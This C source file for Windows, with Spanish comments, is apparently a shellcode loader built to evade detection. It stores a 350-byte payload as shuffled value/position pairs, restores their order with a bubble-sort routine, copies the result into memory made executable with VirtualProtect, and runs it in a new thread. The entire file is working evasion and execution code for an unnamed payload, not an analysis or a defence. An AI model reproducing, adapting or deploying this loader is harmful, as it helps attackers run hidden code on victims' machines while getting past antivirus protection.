
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

typedef struct {
	unsigned char value;
	int position;
}BubbleUnit;

void bubbleDecode(BubbleUnit* unit, unsigned char* text, unsigned int length) { //reordena el payload a partir del valor position de cada BubbleUnit 
	bool finish = false;
	while (!finish) {
		finish = true;
		for (int i = 0; i < length - 1; i++) {
			if (unit[i].position > unit[i + 1].position) {
				finish = false;
				unit[i].value = unit[i].value ^ unit[i + 1].value;
				unit[i + 1].value = unit[i].value ^ unit[i + 1].value;
				unit[i].value = unit[i].value ^ unit[i + 1].value;

				unit[i].position = unit[i].position ^ unit[i + 1].position;
				unit[i + 1].position = unit[i].position ^ unit[i + 1].position;
				unit[i].position = unit[i].position ^ unit[i + 1].position;
			}
		}
	}
	for (int i = 0; i < length; i++) {

		text[i] = unit[i].value;
	}
}

int main(void) {

	void* alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
	DWORD oldprotect = 0;

	BubbleUnit encodedPayload[] = {
		{0x0,0xa},{0x0,0xb},{0x0,0xc},{0x0,0x5a},{0x0,0x5b},{0x0,0x5c},{0x0,0xe4},{0x0,0xe5},{0x0,0xf2},{0x0,0xf3},{0x0,0xf4},
		{0x0,0xfb},{0x0,0xfc},{0x0,0x103},{0x0,0x104},{0x0,0x130},{0x0,0x144},{0x0,0x152},{0x0,0x15d},{0x1,0x43},{0x1,0x54},
		{0x1,0x63},{0x1,0x70},{0x1,0x7d},{0x1,0x8b},{0x1,0xa3},{0x1,0xb1},{0x1,0xb9},{0x1,0xe3},{0x1,0xfa},{0x1,0x102},
		{0x2,0x3b},{0x3,0x93},{0x4,0xb6},{0x5,0x129},{0x6,0x122},{0x7,0xeb},{0x7,0x10d},{0x8,0x96},{0xa,0x114},{0xa,0x124},
		{0xc,0xa9},{0xd,0x41},{0xd,0x89},{0xf,0x2d},{0x12,0xd7},{0x13,0x12c},{0x18,0x20},{0x18,0x69},{0x1c,0xaf},{0x1d,0x112},
		{0x20,0x25},{0x20,0x3d},{0x20,0x4e},{0x20,0x6e},{0x20,0xcb},{0x20,0x13b},{0x20,0x149},{0x21,0x143},{0x21,0x151},{0x24,0x95},
		{0x24,0xa1},{0x26,0xea},{0x28,0x120},{0x2a,0xf9},{0x2a,0x113},{0x2c,0x3c},{0x2e,0x159},{0x31,0x15},{0x31,0x32},{0x31,0x35},
		{0x31,0x80},{0x31,0x83},{0x31,0x106},{0x32,0x158},{0x33,0x157},{0x34,0x7a},{0x38,0x8d},{0x38,0x101},{0x39,0x98},{0x3c,0x38},
		{0x3c,0x52},{0x3c,0x121},{0x3e,0x1c},{0x3e,0x21},{0x3e,0x26},{0x3e,0x2b},{0x3e,0x4a},{0x3e,0x4f},{0x3e,0x56},{0x3e,0x66},
		{0x3e,0x6a},{0x3e,0x77},{0x3e,0x91},{0x3e,0x9d},{0x3e,0xa6},{0x3e,0xab},{0x3e,0xb3},{0x3e,0xd4},{0x3e,0xde},{0x3e,0xf5},
		{0x3e,0xfd},{0x40,0x6d},{0x40,0xa0},{0x40,0xae},{0x40,0xf1},{0x41,0xd},{0x41,0xf},{0x41,0x3e},{0x41,0x42},{0x41,0x48},
		{0x41,0x78},{0x41,0x86},{0x41,0x8a},{0x41,0xa7},{0x41,0xb4},{0x41,0xbb},{0x41,0xbd},{0x41,0xc2},{0x41,0xc4},{0x41,0xc6},
		{0x41,0xcc},{0x41,0xd1},{0x41,0xe6},{0x41,0x108},{0x41,0x115},{0x41,0x132},{0x42,0x51},{0x44,0x6b},{0x44,0x9e},{0x44,0xac},
		{0x44,0x141},{0x44,0x14f},{0x45,0x97},{0x45,0x10a},{0x46,0xe2},{0x47,0x12b},{0x47,0x140},{0x47,0x14e},{0x48,0x1},{0x48,0x14},
		{0x48,0x18},{0x48,0x1d},{0x48,0x22},{0x48,0x27},{0x48,0x2c},{0x48,0x34},{0x48,0x4b},{0x48,0x53},{0x48,0x5d},{0x48,0x62},
		{0x48,0x68},{0x48,0x74},{0x48,0x7c},{0x48,0x82},{0x48,0xaa},{0x48,0xb8},{0x48,0xc8},{0x48,0xd5},{0x48,0xdf},{0x48,0xf6},
		{0x48,0x105},{0x48,0x11d},{0x48,0x137},{0x48,0x13c},{0x48,0x145},{0x48,0x14a},{0x49,0x6f},{0x49,0xa2},{0x49,0xb0},{0x49,0xd9},
		{0x49,0xee},{0x4a,0x2f},{0x4a,0x30},{0x4c,0x92},{0x4c,0x94},{0x4c,0xe8},{0x4c,0xfe},{0x4c,0x142},{0x4c,0x150},{0x4d,0x31},
		{0x4d,0x7f},{0x50,0x10},{0x50,0x2a},{0x50,0x65},{0x51,0xe},{0x51,0x12},{0x51,0x49},{0x52,0x11},{0x52,0x1a},{0x52,0x1f},
		{0x52,0x24},{0x52,0x47},{0x52,0x4d},{0x52,0xcd},{0x56,0x13},{0x56,0x10c},{0x58,0x9c},{0x58,0xbc},{0x58,0xbe},{0x58,0xc3},
		{0x58,0xd0},{0x59,0xc0},{0x59,0xc5},{0x59,0xd2},{0x59,0x131},{0x5a,0xc1},{0x5a,0xc7},{0x5a,0xd3},{0x5c,0x73},{0x5d,0xdd},
		{0x5e,0xbf},{0x60,0x1b},{0x61,0x39},{0x61,0x13a},{0x61,0x13d},{0x61,0x148},{0x61,0x14b},{0x63,0x13e},{0x63,0x14c},{0x64,0x15a},
		{0x65,0x17},{0x65,0x155},{0x66,0xa5},{0x6a,0x12f},{0x6b,0x13f},{0x6b,0x14d},{0x6c,0x139},{0x6c,0x147},{0x6c,0x15b},{0x6c,0x15c},
		{0x6f,0x61},{0x6f,0x12e},{0x6f,0x138},{0x6f,0x146},{0x72,0x29},{0x72,0x12d},{0x72,0x156},{0x73,0x154},{0x74,0x60},{0x75,0x8f},
		{0x75,0x9a},{0x75,0x128},{0x75,0x153},{0x77,0xe9},{0x7c,0x3a},{0x7c,0x123},{0x80,0x58},{0x80,0x125},{0x81,0x2},{0x83,0xc9},
		{0x83,0x10b},{0x83,0x11e},{0x85,0x5e},{0x85,0x100},{0x88,0x59},{0x88,0x7b},{0x88,0xb7},{0x89,0x133},{0x8b,0x19},{0x8b,0x1e},
		{0x8b,0x23},{0x8b,0x28},{0x8b,0x4c},{0x8b,0x50},{0x8b,0x57},{0x8b,0x67},{0x8b,0x6c},{0x8b,0x79},{0x8b,0x9f},{0x8b,0xa8},
		{0x8b,0xad},{0x8b,0xb5},{0x8b,0xd6},{0x8d,0xe0},{0x8d,0xe1},{0x8d,0xf7},{0x8d,0xff},{0x95,0xf8},{0x95,0x118},{0x9d,0x11a},
		{0xa6,0x117},{0xac,0x37},{0xac,0x85},{0xb7,0x2e},{0xba,0xe7},{0xba,0x109},{0xba,0x116},{0xbb,0x110},{0xbb,0x12a},{0xbd,0x119},
		{0xc0,0x36},{0xc0,0x5f},{0xc0,0x84},{0xc1,0x3f},{0xc1,0x44},{0xc1,0x87},{0xc1,0x8c},{0xc1,0xf0},{0xc4,0x11f},{0xc7,0xef},
		{0xc9,0x33},{0xc9,0x40},{0xc9,0x76},{0xc9,0x81},{0xc9,0x88},{0xc9,0x107},{0xd0,0x9},{0xd0,0x55},{0xd0,0x64},{0xd0,0x71},
		{0xd0,0xa4},{0xd0,0xb2},{0xd0,0xba},{0xd1,0x99},{0xd2,0x16},{0xd5,0xed},{0xd5,0x10f},{0xd5,0x11c},{0xd5,0x136},{0xd6,0x7e},
		{0xd6,0x9b},{0xda,0x134},{0xe0,0x8e},{0xe0,0xcf},{0xe0,0x111},{0xe0,0x127},{0xe2,0x45},{0xe3,0x72},{0xe4,0x3},{0xe8,0x8},
		{0xe9,0xd8},{0xec,0xca},{0xed,0x46},{0xf0,0x4},{0xf1,0x90},{0xfb,0x126},{0xfc,0x0},{0xff,0x5},{0xff,0x6},{0xff,0x7},
		{0xff,0x75},{0xff,0xce},{0xff,0xda},{0xff,0xdb},{0xff,0xdc},{0xff,0xec},{0xff,0x10e},{0xff,0x11b},{0xff,0x135},{0x0,0x15e}
	};

	unsigned char shellcodePayload[350];
	unsigned int lengthOfshellcodePayload = 350;

	bubbleDecode(encodedPayload, shellcodePayload, lengthOfshellcodePayload); // Decodificar payload

	// Reservar memoria para shellcodePayload
	alloc_mem = VirtualAlloc(0, lengthOfshellcodePayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copiar shellcodePayload a la memoria reservada
	RtlMoveMemory(alloc_mem, shellcodePayload, lengthOfshellcodePayload);

	// Definir como ejecutable la memoria reservada
	retval = VirtualProtect(alloc_mem, lengthOfshellcodePayload, PAGE_EXECUTE_READ, &oldprotect);


	// Si VirtualProtect funciona, ejecutar el payload como un nuevo hilo
	if (retval != 0) {
		threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)alloc_mem, 0, 0, 0);
		WaitForSingleObject(threadHandle, -1);
	}

	return 0;
}
